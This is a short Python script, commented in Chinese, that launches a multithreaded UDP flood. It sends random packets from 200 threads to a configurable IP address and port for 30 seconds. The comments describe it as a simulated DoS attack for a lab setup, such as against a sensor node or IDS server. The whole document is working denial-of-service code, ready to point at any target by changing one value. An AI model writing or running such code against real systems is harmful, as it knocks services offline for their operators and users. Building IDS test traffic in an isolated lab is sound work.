import socket
import random
import threading
import time

# =============================
# 配置参数（请根据实验环境修改）
# =============================
target_ip = "192.168.1.100"     # 替换为你的目标IP（例如传感器节点或IDS服务器）
target_port = 5050                # 替换为目标开放的端口
threads_count = 200               # 启动线程数（建议不要太高，避免电脑卡顿）
packet_size = 1024                # 每次发送的数据大小（字节）
duration = 30                     # 持续时间（秒）

# =============================
# 模拟DoS攻击函数
# =============================
def dos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(packet_size)  # 随机数据包内容
            s.sendto(data, (target_ip, target_port))
            print(f"[+] Sent packet to {target_ip}:{target_port}")
        except Exception as e:
            print(f"[-] Error: {e}")
            break
        finally:
            s.close()

# =============================
# 多线程启动攻击
# =============================
def start_dos_attack():
    print(f"[*] Starting DoS attack on {target_ip}:{target_port} for {duration} seconds...")
    end_time = time.time() + duration

    for i in range(threads_count):
        thread = threading.Thread(target=dos_attack)
        thread.daemon = True
        thread.start()
        print(f"Thread {i+1} started.")

    while time.time() < end_time:
        pass

    print("[*] Attack finished.")

if __name__ == '__main__':
    start_dos_attack()